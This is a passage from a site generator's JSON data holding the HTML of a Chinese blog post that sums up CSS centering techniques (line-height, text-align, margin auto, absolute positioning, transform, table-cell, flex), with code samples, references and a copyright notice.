solid red; &#125;</span><br><span class=\"line\">&lt;input class=&quot;origin_inlineB_center&quot; type=&quot;text&quot; value=&quot;aaaaa&quot;&gt;</span><br><span class=\"line\">&lt;button class=&quot;origin_inlineB_center&quot; &gt;aaaaa&lt;/button&gt;</span><br><span class=\"line\">&lt;textarea sclass=&quot;origin_inlineB_center&quot; &gt;aaaaa&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>需注意:</strong></p>\n<ol>\n<li>子元素为inline-block元素，父级加line-height等于height，并不能使子元素居中：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; height: 200px; width:100px; line-height: 200px; border:1px solid red; &#125;</span><br><span class=\"line\">.child &#123; height: 100px; width:100px; background: red; display: inline-block; &#125;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">        &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 或者原生inline-block元素也不行,class内容同上，.child 去掉display:inline-block --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;input class=&quot;child&quot; type=&quot;button&quot; name=&quot;&quot;&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- or --&gt;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;1.jpg&quot; class=&quot;child&quot;&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>都是这样的结果：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/align/1.png\" alt=\"align/1\"> <img src=\"http://o798x2hdw.bkt.clouddn.com/align/2.png\" alt=\"align/2\"></p>\n<h2 id=\"text-align-center–水平居中\"><a href=\"#text-align-center–水平居中\" class=\"headerlink\" title=\"text-align:center–水平居中\"></a>text-align:center–水平居中</h2><p>text-align顾名思义，其主要作用是对齐text的，具体说来：</p>\n<ol>\n<li><p>是使block / inline-block元素的内容文本水平居中，但对inline-block元素select无效</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- div元素 --&gt;</span><br><span class=\"line\">.center &#123; text-align:center &#125;</span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;This text will be in the center&lt;/div&gt;</span><br><span class=\"line\">&lt;p class=&quot;center&quot;&gt;dsfadfadfafgdfs&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- inline-block元素 --&gt;</span><br><span class=\"line\">.inlineB_center &#123; text-align:center; width:100px; &#125;</span><br><span class=\"line\">&lt;input class=&quot;inlineB_center&quot; value=&quot;aaaaa&quot; type=&quot;text&quot;&gt;</span><br><span class=\"line\">&lt;button class=&quot;inlineB_center&quot;&gt;aaaaa&lt;/button&gt;</span><br><span class=\"line\">&lt;textarea class=&quot;inlineB_center&quot;&gt;aaaaa&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此外，还可以使作为子元素的inline / inline-block元素在父元素内水平居中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.center &#123; text-align:center; width: 200px; height:100px; border:1px solid red; &#125;</span><br><span class=\"line\">.centerChild &#123; width:100px; height:100px; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;div style=&quot;display:inline&quot;&gt;aaa&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;div style=&quot;display:inline-block&quot;&gt;aaa&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- or 原生inline-block元素 --&gt;</span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;1.jpg&quot; class=&quot;centerChild&quot;&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"padding–水平垂直居中\"><a href=\"#padding–水平垂直居中\" class=\"headerlink\" title=\"padding–水平垂直居中\"></a>padding–水平垂直居中</h2><p>通过在内容的上下左右添加同样的距离，来反向达到内容居中的效果。通过这种方法实现居中，限制条件比较多。这种居中相当于在模拟标准盒模型，父级相当于border，子级相当于content，二者的宽高通过padding相互制约。所以一般不使用padding来做居中，它经常的使用场景是，在一块内容分区的边线内的四面留白。如下图红线框起来的内容区和外边框之间的留白<br><img src=\"http://o798x2hdw.bkt.clouddn.com/align/3.png\" alt=\"align/3\"></p>\n<h2 id=\"margin-0-auto–水平居中\"><a href=\"#margin-0-auto–水平居中\" class=\"headerlink\" title=\"margin 0 auto–水平居中\"></a>margin 0 auto–水平居中</h2><p>最常使用的是margin:xx auto，可以令子级水平居中，但是在上下margin上设定auto却不能令其垂直居中，这是由CSS2规范的规定决定的^1。</p>\n<p>原理是，CSS2规范规定：</p>\n<blockquote>\n<p>块级元素在普通流内布局按以下公式：左m+左b+左p+w+右p+右b+右m = 包含块宽度<br>如果宽度w不是auto，并且左margin和右margin都是auto的话，两者相等。</p>\n</blockquote>\n<p>然而纵向margin没有规定，于是就不能垂直居中。</p>\n<p><strong>限制条件是：</strong></p>\n<ol>\n<li>父级子级均为block元素</li>\n<li>父级子级宽度固定</li>\n<li>并且处于正常文档流中</li>\n</ol>\n<p><strong>失效情况：</strong></p>\n<ol>\n<li>如果子级是inline元素或者inline-block元素，居中会失效；</li>\n<li>如果没有设定父级宽度，居中会失效；</li>\n<li>如果子级宽度为auto那就整行撑满父级，宽度等于父级了，也就没有什么居中不居中了；</li>\n<li>子级设定了绝对定位或者固定定位，脱离了正常文档流，居中会失效；</li>\n<li>另外如果不写DOCTYPE或者写的不正确也会导致失效。</li>\n</ol>\n<h2 id=\"absolute-left-top-50-margin为宽-高一半的负值–水平垂直居中\"><a href=\"#absolute-left-top-50-margin为宽-高一半的负值–水平垂直居中\" class=\"headerlink\" title=\"absolute + left/top 50% + margin为宽/高一半的负值–水平垂直居中\"></a>absolute + left/top 50% + margin为宽/高一半的负值–水平垂直居中</h2><p><strong>限制条件：</strong></p>\n<ol>\n<li>父级定位relative，子级定位absolute,</li>\n<li>子级宽度确定<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; border:2px solid #f77; height:100px; width:300px; position:relative; &#125;</span><br><span class=\"line\">.child &#123; width:100px; height:100px; background:#7c7; position:absolute; left:50%;  margin-left:-50px;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/4.png\" alt=\"align/4\"></p>\n<p>margin负值的重要作用有^2：</p>\n<ol>\n<li><p>相对自身偏移，达到的视觉效果相当于<code>position：relative; top：-xx; left:-xx; right:-xx; bottom:-xx</code>，但与之的区别在于，relative偏移后仍占据原来的位置，margin负值的偏移连原来占据的位置也会偏移，常利用这点，设置左上的margin负值，遮盖左边或者上边的border，如果设置右下的，则会被后面的内容遮住。</p>\n</li>\n<li><p>扩展宽度例如</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div &#123; width:432px; background:#999; &#125;</span><br><span class=\"line\">ul &#123; margin-right: -10px; height:200px; border:1px solid #f77; padding:0;&#125;</span><br><span class=\"line\">li &#123; width:100px; margin-right:10px; float:left; height:100px; background:#7c7; list-style: none;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\">    &lt;ul&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">    &lt;/ul&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/5.png\" alt=\"align/5\"></p>\n<h2 id=\"absolute-left-top-50-transform-translate–水平垂直居中\"><a href=\"#absolute-left-top-50-transform-translate–水平垂直居中\" class=\"headerlink\" title=\"absolute + left/top 50% + transform translate–水平垂直居中\"></a>absolute + left/top 50% + transform translate–水平垂直居中</h2><p>上面的居中方法有一个限制是必须知道子级的宽高，CSS3中的transform的translate可以基于自身尺寸设定百分数，这样就不用知道子级的宽高，也能做到居中了。此方法从张鑫旭大神博客学来^3，感谢大神。<br>缺点： IE9(-ms-), IE10+以及其他现代浏览器才支持<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; position:relative; </span><br><span class=\"line\">          width:300px; height: 300px; border:1px solid red;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">.child &#123; position:absolute; </span><br><span class=\"line\">         left:50%; </span><br><span class=\"line\">         top:50%;</span><br><span class=\"line\">         transform: translate(-50%, -50%);</span><br><span class=\"line\"></span><br><span class=\"line\">         width:100px; height: 100px; background: #7c7;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/6.png\" alt=\"align/6\"></p>\n<h2 id=\"margin：auto-absolute-0-0-0-0–水平垂直居中\"><a href=\"#margin：auto-absolute-0-0-0-0–水平垂直居中\" class=\"headerlink\" title=\"margin：auto + absolute 0 0 0 0–水平垂直居中\"></a>margin：auto + absolute 0 0 0 0–水平垂直居中</h2><p>比起上面的方法，可以兼容IE8+浏览器，同样来自张鑫旭大神^3，出来效果同上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; position:relative; </span><br><span class=\"line\">          width:300px; height: 300px; border:1px solid red;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">.child &#123; position:absolute; </span><br><span class=\"line\">         left:0;</span><br><span class=\"line\">         top:0; </span><br><span class=\"line\">         right: 0; </span><br><span class=\"line\">         bottom: 0;</span><br><span class=\"line\"></span><br><span class=\"line\">         margin:auto;</span><br><span class=\"line\"></span><br><span class=\"line\">         width:100px; height: 100px; background: #7c7; </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p>简单翻译下原理 ^4：</p>\n<ol>\n<li>正常文档流内，对于top和bottom，margin为auto，等同于margin等于零；</li>\n<li>absolute使之脱离正常文档流，此时的margin auto相当于不起作用了；</li>\n<li>设定四面都为0后，浏览器会在设定了relative的父元素内，贴近父元素的border设置一个边界盒子（bound box），此时，边界盒子占满父元素所有空间；</li>\n<li>给子元素设定了宽或者高，就阻止其占满父元素所有空间，迫使浏览器基于边界盒子重新计算margin：auto；</li>\n<li>现在元素是绝对定位，非正常文档流，浏览器计算margin：auto时，就让上下margin相等（基于规范规定），这样元素就居中于边界盒子（bound box），也就居中于父元素了。</li>\n</ol>\n<h2 id=\"table-cell-vertical-align-–水平居中\"><a href=\"#table-cell-vertical-align-–水平居中\" class=\"headerlink\" title=\"table-cell + vertical-align –水平居中\"></a>table-cell + vertical-align –水平居中</h2><p>如果是在td元素中，可以直接使用属性valign=”middle”做垂直居中，align=”center”做水平居中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">td &#123; width:300px; height: 300px; border:1px solid red; &#125;</span><br><span class=\"line\">.tdChild &#123; width:100px; height: 100px; background: #7c7; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;td valign=&quot;middle&quot; align=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;tdChild&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果没有table，没有td元素，可以用css这样写：<br>这种方法，子级不需要大小固定，可以用于：多行文字居中、大小不固定图片的居中<br>有一个疑问，许多博客写这种方法的时候，都要给.father再加一个父级，让这个父级display:table,我不知道为什么要这么加，因为不加的时候就可以居中。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123;</span><br><span class=\"line\">    display: table-cell;</span><br><span class=\"line\">    vertical-align: middle;</span><br><span class=\"line\">     </span><br><span class=\"line\">    width:300px; </span><br><span class=\"line\">    height: 300px; </span><br><span class=\"line\">    border:1px solid red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.child &#123; display: inline-block; background: #7c7; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;dafsdf sda sdf sdfas sdf&lt;br&gt;dsfasd sdf dd &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"css3-flex居中–水平垂直居中\"><a href=\"#css3-flex居中–水平垂直居中\" class=\"headerlink\" title=\"css3 flex居中–水平垂直居中\"></a>css3 flex居中–水平垂直居中</h2><p>兼容性不太好，适用于手机端开发，水平垂直居中：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; display:-webkit-box;</span><br><span class=\"line\">    -webkit-box-align:center;</span><br><span class=\"line\">    -webkit-box-pack:center;</span><br><span class=\"line\">    </span><br><span class=\"line\">    width:300px; </span><br><span class=\"line\">    height: 300px; </span><br><span class=\"line\">    border:1px solid red; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">.child &#123; display:-webkit-flex; </span><br><span class=\"line\"></span><br><span class=\"line\">    width: 100px; </span><br><span class=\"line\">    height:100px; </span><br><span class=\"line\">    background: #7c7; </span><br><span class=\"line\">    margin-bottom:10px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/7.png\" alt=\"align/7\"></p>\n<p>本人常用的就是这些居中方法了，还有一些居中方式，本人比较不常用，由于精力有限就不加了。另外小可才疏学浅，时间仓促，如有错漏处，请大力批评！另外的另外，写博客真累，但是也真的很有成就感呀，赫赫~~</p>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css</a></p>\n</blockquote>\n<p>参考链接：</p>\n<p>^1:<a href=\"https://www.zhihu.com/question/21644198\" target=\"_blank\" rel=\"noopener\">为什么「margin:auto」可以让块级元素水平居中？</a><br>^2:<a href=\"http://www.cnblogs.com/2050/archive/2012/08/13/2636467.html\" target=\"_blank\" rel=\"noopener\">CSS布局奇淫巧计之-强大的负边距</a><br>^3:<a href=\"http://www.zhangxinxu.com/wordpress/2013/11/margin-auto-absolute-%E7%BB%9D%E5%AF%B9%E5%AE%9A%E4%BD%8D-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/\" target=\"_blank\" rel=\"noopener\">小tip: margin:auto实现绝对定位元素的水平垂直居中</a><br>^4:<a href=\"https://www.smashingmagazine.com/2013/08/absolute-horizontal-vertical-centering-css\" target=\"_blank\" rel=\"noopener\">Absolute Horizontal And Vertical Centering In CSS</a></p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>by MaryTien from <a href=\"http://luckymona.github.io\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css</a></p>\n</blockquote>\n<p>之前差不多有小半年时间做切图仔，虽然居中的方法来来去去常用的就那么几个，但是由于没有认真总结过每种方案适用的场景，有时遇到居中需求还是不能一下就用对方法，试来试去浪费时间。本文就对CSS中的常用的居中方案来个总结，本想来个最强总结，但是CSS套路太多，写着写着就不想写了==!，于是变成了常用方案的总结。（文中例子均为以chrome测试结果）<br></p>","more":"<p></p>\n<h1 id=\"常用元素分类–按照块元素、行内元素\"><a href=\"#常用元素分类–按照块元素、行内元素\" class=\"headerlink\" title=\"常用元素分类–按照块元素、行内元素\"></a>常用元素分类–按照块元素、行内元素</h1><p>居中的需求常常涉及这些因素：内联元素居中、块元素居中，块元素居中又分为定宽度、不定宽度，还有各种定位、浮动、父元素宽高，等等。于是我先把常用元素按照display值分一下类。根据二八原则，仅举常用的比较重要的小朋友，且不包括HTML5那些新标签（多了人家记不住嘛，脑细胞要想更重要的事 <del>嗯，一个借口</del>）</p>\n<h2 id=\"常用block元素：\"><a href=\"#常用block元素：\" class=\"headerlink\" title=\"常用block元素：\"></a>常用block元素：</h2><p>文档类：head \\ html \\ body<br>文章类：h \\ h1~h6 \\ p<br>布局类：div \\ br \\ hr<br>列表类：ol \\ ul \\ li \\ dl \\ dt \\ dd<br>表单类：form<br>需注意的：<strong>hr是块元素，可以设定宽高</strong></p>\n<h2 id=\"常用inline元素：\"><a href=\"#常用inline元素：\" class=\"headerlink\" title=\"常用inline元素：\"></a>常用inline元素：</h2><p>a \\ span \\ strong \\ i \\ em \\ del \\ q </p>\n<h2 id=\"常用的inline-block元素：\"><a href=\"#常用的inline-block元素：\" class=\"headerlink\" title=\"常用的inline-block元素：\"></a>常用的inline-block元素：</h2><p>img \\ input \\ button \\ select \\ textarea</p>\n<h2 id=\"其他元素：\"><a href=\"#其他元素：\" class=\"headerlink\" title=\"其他元素：\"></a>其他元素：</h2><ol>\n<li>与select搭配使用的option、optgroup，虽然是display:block的元素，但是却不能设定宽高</li>\n<li>起配置作用的元素：meta、script、style</li>\n<li>table元素：（markdown中写表格很费劲，推荐一个插件TableEditor）</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">table元素名</th>\n<th style=\"text-align:center\">display值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">table</td>\n<td style=\"text-align:center\">table</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">thead</td>\n<td style=\"text-align:center\">table-header-group</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">tbody</td>\n<td style=\"text-align:center\">table-row-group</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">tfoot</td>\n<td style=\"text-align:center\">table-footer-group</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">tr</td>\n<td style=\"text-align:center\">table-row</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">th / td</td>\n<td style=\"text-align:center\">table-cell</td>\n</tr>\n</tbody>\n</table>\n<p>inline元素不存在宽高，也就不存在居不居中的问题。所以讨论居中主要是讨论block / inline-block元素的居中。</p>\n<h1 id=\"居中主要用到的技术\"><a href=\"#居中主要用到的技术\" class=\"headerlink\" title=\"居中主要用到的技术\"></a>居中主要用到的技术</h1><h2 id=\"line-height–垂直居中\"><a href=\"#line-height–垂直居中\" class=\"headerlink\" title=\"line-height–垂直居中\"></a>line-height–垂直居中</h2><p>block / inline-block元素，通过使height值等于line-height值，使 <strong>单行文本内容</strong> 或者 <strong>单行display:inline的元素</strong>垂直居中:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.block_center &#123; height:200px; line-height:200px; border:1px solid red; &#125;</span><br><span class=\"line\">.inlineB_center &#123; display:inline-block; height:200px; line-height:200px; border:1px solid red; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p class=&quot;block_Center&quot;&gt;dfasdfadfa&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;inlineB_center&quot;&gt;dfasdfadfa&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">.origin_inlineB_center &#123; height:200px; line-height:200px; border:1px solid red; &#125;</span><br><span class=\"line\">&lt;input class=&quot;origin_inlineB_center&quot; type=&quot;text&quot; value=&quot;aaaaa&quot;&gt;</span><br><span class=\"line\">&lt;button class=&quot;origin_inlineB_center&quot; &gt;aaaaa&lt;/button&gt;</span><br><span class=\"line\">&lt;textarea sclass=&quot;origin_inlineB_center&quot; &gt;aaaaa&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>需注意:</strong></p>\n<ol>\n<li>子元素为inline-block元素，父级加line-height等于height，并不能使子元素居中：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; height: 200px; width:100px; line-height: 200px; border:1px solid red; &#125;</span><br><span class=\"line\">.child &#123; height: 100px; width:100px; background: red; display: inline-block; &#125;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">        &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 或者原生inline-block元素也不行,class内容同上，.child 去掉display:inline-block --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;input class=&quot;child&quot; type=&quot;button&quot; name=&quot;&quot;&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- or --&gt;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;1.jpg&quot; class=&quot;child&quot;&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>都是这样的结果：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/align/1.png\" alt=\"align/1\"> <img src=\"http://o798x2hdw.bkt.clouddn.com/align/2.png\" alt=\"align/2\"></p>\n<h2 id=\"text-align-center–水平居中\"><a href=\"#text-align-center–水平居中\" class=\"headerlink\" title=\"text-align:center–水平居中\"></a>text-align:center–水平居中</h2><p>text-align顾名思义，其主要作用是对齐text的，具体说来：</p>\n<ol>\n<li><p>是使block / inline-block元素的内容文本水平居中，但对inline-block元素select无效</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- div元素 --&gt;</span><br><span class=\"line\">.center &#123; text-align:center &#125;</span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;This text will be in the center&lt;/div&gt;</span><br><span class=\"line\">&lt;p class=&quot;center&quot;&gt;dsfadfadfafgdfs&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- inline-block元素 --&gt;</span><br><span class=\"line\">.inlineB_center &#123; text-align:center; width:100px; &#125;</span><br><span class=\"line\">&lt;input class=&quot;inlineB_center&quot; value=&quot;aaaaa&quot; type=&quot;text&quot;&gt;</span><br><span class=\"line\">&lt;button class=&quot;inlineB_center&quot;&gt;aaaaa&lt;/button&gt;</span><br><span class=\"line\">&lt;textarea class=&quot;inlineB_center&quot;&gt;aaaaa&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此外，还可以使作为子元素的inline / inline-block元素在父元素内水平居中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 